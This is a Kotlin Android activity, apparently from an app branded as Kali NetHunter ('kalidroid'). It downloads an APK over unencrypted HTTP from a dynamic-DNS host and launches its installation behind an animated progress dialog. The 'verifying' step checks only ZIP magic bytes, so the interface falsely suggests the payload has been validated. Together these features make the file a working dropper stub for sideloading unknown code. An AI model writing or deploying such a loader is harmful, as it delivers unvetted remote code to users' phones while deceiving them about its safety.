package com.nethunter.kalidroid

import android.app.AlertDialog
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.google.android.material.button.MaterialButton
import com.google.android.material.progressindicator.CircularProgressIndicator
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "KaliDroid"
        private const val APK_URL = "http://kimo.gotdns.ch/setup.apk"
        private const val FILE_PROVIDER_AUTHORITY = "com.nethunter.kalidroid.provider"
    }

    private val handler = Handler(Looper.getMainLooper())
    private var downloadThread: Thread? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<ImageView>(R.id.ivMainRingScanner)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
        findViewById<ImageView>(R.id.ivMainRingDashed)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))
        findViewById<View>(R.id.mainStatusDot)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))

        findViewById<MaterialButton>(R.id.btnDownload).setOnClickListener {
            showDownloadDialog()
        }
    }

    private fun showDownloadDialog() {
        val dialogView = layoutInflater.inflate(R.layout.dialog_progress, null)

        val tvPhase       = dialogView.findViewById<TextView>(R.id.tvPhase)
        val ivPhaseIcon   = dialogView.findViewById<ImageView>(R.id.ivPhaseIcon)
        val tvLive        = dialogView.findViewById<TextView>(R.id.tvLive)
        val statusDot     = dialogView.findViewById<View>(R.id.statusDot)
        val tvStatus      = dialogView.findViewById<TextView>(R.id.tvStatus)
        val tvStatusHint  = dialogView.findViewById<TextView>(R.id.tvStatusHint)
        val progressBar   = dialogView.findViewById<ProgressBar>(R.id.progressBar)
        val circular      = dialogView.findViewById<CircularProgressIndicator>(R.id.circularProgress)
        val tvPercent     = dialogView.findViewById<TextView>(R.id.tvPercent)
        val tvSpeed       = dialogView.findViewById<TextView>(R.id.tvSpeed)
        val tvSize        = dialogView.findViewById<TextView>(R.id.tvSize)
        val tvRemaining   = dialogView.findViewById<TextView>(R.id.tvRemaining)
        val ringScanner   = dialogView.findViewById<ImageView>(R.id.ivRingScanner)
        val ringDashed    = dialogView.findViewById<ImageView>(R.id.ivRingDashed)
        val btnCancel     = dialogView.findViewById<MaterialButton>(R.id.btnCancel)

        // Decorative animations
        ringScanner.startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
        ringDashed.startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))
        statusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))

        circular.max = 1000
        circular.setProgressCompat(0, false)

        val dialog = AlertDialog.Builder(this, R.style.DownloadDialogTheme)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        btnCancel.setOnClickListener {
            downloadThread?.interrupt()
            dialog.dismiss()
        }

        dialog.show()

        tvPhase.text     = getString(R.string.phase_downloading)
        tvStatus.text    = getString(R.string.status_connecting)
        tvStatusHint.text = getString(R.string.status_hint_connect)

        downloadThread = Thread {
            try {
                val apkFile = downloadApk(
                    onProgress = { percent, downloadedBytes, totalBytes, speedMbps, remainingSecs ->
                        handler.post {
                            val scaled = (percent * 10).coerceIn(0, 1000)
                            progressBar.progress = scaled
                            circular.setProgressCompat(scaled, true)
                            tvPercent.text = getString(R.string.percent_format, percent)
                            tvSpeed.text   = getString(R.string.speed_format, speedMbps)
                            tvSize.text    = getString(
                                R.string.size_format,
                                formatBytes(downloadedBytes),
                                formatBytes(totalBytes)
                            )
                            tvRemaining.text = formatRemaining(remainingSecs)
                        }
                    },
                    onConnected = { totalBytes ->
                        handler.post {
                            tvStatus.text     = getString(R.string.status_downloading)
                            tvStatusHint.text = getString(R.string.status_hint_download)
                            if (totalBytes > 0) {
                                tvSize.text = getString(
                                    R.string.size_format,
                                    formatBytes(0L),
                                    formatBytes(totalBytes)
                                )
                            }
                        }
                    }
                )

                Log.d(TAG, "Downloaded: ${apkFile.absolutePath} (${apkFile.length()} B)")

                handler.post {
                    tvPhase.text      = getString(R.string.phase_verifying)
                    tvStatus.text     = getString(R.string.status_verifying)
                    tvStatusHint.text = getString(R.string.status_hint_verify)
                }

                // Validate ZIP/APK magic: PK\x03\x04
                val magic = ByteArray(4)
                val magicRead = apkFile.inputStream().use { it.read(magic) }
                if (magicRead < 4 || magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
                    val hex = magic.take(magicRead).joinToString(" ") { "%02X".format(it) }
                    Log.e(TAG, "Not a valid APK: $hex")
                    throw Exception("Downloaded file is not a valid APK ($hex)")
                }

                handler.post {
                    progressBar.progress = 1000
                    circular.setProgressCompat(1000, true)
                    tvPercent.text  = getString(R.string.percent_format, 100)
                    tvSpeed.text    = getString(R.string.dash)
                    tvRemaining.text = getString(R.string.dash)
                    tvPhase.text    = getString(R.string.phase_installing)
                    tvStatus.text   = getString(R.string.status_installing)
                    tvStatusHint.text = getString(R.string.status_hint_install)
                }

                Thread.sleep(700)
                handler.post { dialog.dismiss(); installApk(apkFile) }

            } catch (_: InterruptedException) {
                // user cancelled
            } catch (e: Exception) {
                handler.post {
                    statusDot.clearAnimation()
                    statusDot.alpha = 1f
                    statusDot.setBackgroundResource(R.drawable.status_dot)
                    statusDot.backgroundTintList = android.content.res.ColorStateList.valueOf(
                        getColor(R.color.invalid_red)
                    )
                    tvLive.text = getString(R.string.offline_label)
                    tvLive.setTextColor(getColor(R.color.invalid_red))
                    tvPhase.text       = getString(R.string.phase_error)
                    tvStatus.text      = e.message ?: getString(R.string.error_unknown)
                    tvStatusHint.text  = getString(R.string.status_hint_error)
                    tvSpeed.text       = getString(R.string.dash)
                    tvRemaining.text   = getString(R.string.dash)
                    btnCancel.text     = getString(android.R.string.ok)
                }
            }
        }
        downloadThread?.start()
    }

    private fun downloadApk(
        onProgress: (percent: Int, downloadedBytes: Long, totalBytes: Long, speedMbps: Double, remainingSecs: Long) -> Unit,
        onConnected: (totalBytes: Long) -> Unit
    ): File {
        val conn = URL(APK_URL).openConnection() as HttpURLConnection
        conn.connectTimeout = 15_000
        conn.readTimeout    = 30_000
        conn.connect()

        val responseCode = conn.responseCode
        if (responseCode != HttpURLConnection.HTTP_OK) {
            throw Exception("Server returned HTTP $responseCode")
        }

        val contentLength = conn.contentLengthLong
        onConnected(contentLength)

        val outFile = File(cacheDir, "setup.apk")

        conn.inputStream.use { input ->
            outFile.outputStream().use { output ->
                val buf = ByteArray(65_536)
                var downloaded = 0L
                var read: Int
                val startTime = System.currentTimeMillis()
                var lastTime  = startTime
                var lastBytes = 0L

                while (input.read(buf).also { read = it } != -1) {
                    if (Thread.currentThread().isInterrupted) throw InterruptedException()
                    output.write(buf, 0, read)
                    downloaded += read

                    val now = System.currentTimeMillis()
                    if (now - lastTime >= 250) {
                        val intervalBytes = downloaded - lastBytes
                        val intervalMs = (now - lastTime).coerceAtLeast(1)
                        val speedBps = intervalBytes * 1000.0 / intervalMs
                        val speedMbps = speedBps / (1024.0 * 1024.0)

                        val percent = if (contentLength > 0) (downloaded * 100 / contentLength).toInt() else -1
                        val remaining = if (contentLength > 0 && speedBps > 0)
                            ((contentLength - downloaded) / speedBps).toLong() else -1L

                        if (percent >= 0) {
                            onProgress(percent.coerceIn(0, 99), downloaded, contentLength, speedMbps, remaining)
                        }
                        lastTime  = now
                        lastBytes = downloaded
                    }
                }
            }
        }
        return outFile
    }

    private fun installApk(file: File) {
        val uri = FileProvider.getUriForFile(this, FILE_PROVIDER_AUTHORITY, file)
        startActivity(
            Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        )
    }

    private fun formatBytes(bytes: Long): String {
        if (bytes <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB")
        var value = bytes.toDouble()
        var unitIdx = 0
        while (value >= 1024.0 && unitIdx < units.size - 1) {
            value /= 1024.0
            unitIdx++
        }
        return if (unitIdx == 0) {
            String.format(Locale.US, "%d %s", value.toLong(), units[unitIdx])
        } else {
            String.format(Locale.US, "%.1f %s", value, units[unitIdx])
        }
    }

    private fun formatRemaining(seconds: Long): String = when {
        seconds < 0   -> getString(R.string.remaining_calculating)
        seconds == 0L -> getString(R.string.dash)
        seconds < 60  -> getString(R.string.remaining_seconds, seconds)
        else          -> getString(R.string.remaining_minutes, seconds / 60, seconds % 60)
    }

    override fun onDestroy() {
        super.onDestroy()
        downloadThread?.interrupt()
    }
}
